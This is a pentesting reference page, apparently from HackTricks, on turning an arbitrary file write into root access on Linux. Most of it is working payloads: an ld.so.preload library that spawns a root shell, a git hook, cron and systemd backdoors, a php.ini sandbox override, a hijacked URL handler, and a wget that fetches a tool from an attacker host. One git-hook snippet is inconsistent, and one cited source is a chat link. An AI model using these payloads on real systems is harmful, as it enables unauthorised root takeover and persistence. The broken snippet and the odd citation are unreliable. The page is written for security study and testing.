# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```

### Cron & Time files

If you can **write cron-related files that root executes**, you can usually get code execution the next time the job runs. Interesting targets include:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root's own crontab in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Quick checks:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typical abuse paths:

- **Append a new root cron job** to `/etc/crontab` or a file in `/etc/cron.d/`
- **Replace a script** already executed by `run-parts`
- **Backdoor an existing timer target** by modifying the script or binary it launches

Minimal cron payload example:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

If you can only write inside a cron directory used by `run-parts`, drop an executable file there instead:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` usually ignores filenames containing dots, so prefer names like `backup` instead of `backup.sh`.
- Some distros use `anacron` or `systemd` timers instead of classic cron, but the abuse idea is the same: **modify what root will execute later**.

### Service & Socket files

If you can write **`systemd` unit files** or files referenced by them, you may be able to get code execution as root by reloading and restarting the unit, or by waiting for the service/socket activation path to trigger.

Interesting targets include:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:

```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```

Common abuse paths:

- **Overwrite `ExecStart=`** in a root-owned service unit you can modify
- **Add a drop-in override** with a malicious `ExecStart=` and clear the old one first
- **Backdoor the script/binary** already referenced by the unit
- **Hijack a socket-activated service** by modifying the corresponding `.service` file that starts when the socket receives a connection

Example malicious override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typical activation flow:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

If you cannot restart services yourself but can edit a socket-activated unit, you may only need to **wait for a client connection** to trigger execution of the backdoored service as root.

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Some custom daemons validate user-supplied PHP by running `php` with a **restricted `php.ini`** (for example, `disable_functions=exec,system,...`). If the sandboxed code still has **any write primitive** (like `file_put_contents`) and you can reach the **exact `php.ini` path** used by the daemon, you can **overwrite that config** to lift restrictions and then submit a second payload that runs with elevated privileges.

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

An attacker with write permissions to a victim's configuration directories can easily replace or create files that change system behavior, resulting in unintended code execution. By modifying the `$HOME/.config/mimeapps.list` file to point HTTP and HTTPS URL handlers to a malicious file (e.g., setting `x-scheme-handler/http=evil.desktop`), the attacker ensures that **clicking any http or https link triggers code specified in that `evil.desktop` file**. For example, after placing the following malicious code in `evil.desktop` in `$HOME/.local/share/applications`, any external URL click runs the embedded command:

```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```

For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root executing user-writable scripts/binaries

If a privileged workflow runs something like `/bin/sh /home/username/.../script` (or any binary inside a directory owned by an unprivileged user), you can hijack it:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirm writeability:** ensure both the target file and its directory are owned/writable by your user.
- **Hijack the target:** backup the original binary/script and drop a payload that creates a SUID shell (or any other root action), then restore permissions:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
